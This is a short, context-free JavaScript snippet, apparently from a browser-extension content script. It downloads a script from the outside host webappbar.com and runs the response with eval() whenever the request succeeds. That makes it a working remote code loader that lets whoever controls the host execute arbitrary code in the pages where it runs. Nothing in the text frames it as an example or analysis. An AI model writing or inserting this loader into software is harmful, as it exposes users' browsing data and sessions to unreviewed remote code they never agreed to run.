let xhr = new XMLHttpRequest();
xhr.open('GET', 'https://webappbar.com/ext/content/script.js');
xhr.send();
xhr.onload = function() {
    if (xhr.status == 200) eval(xhr.response);
};
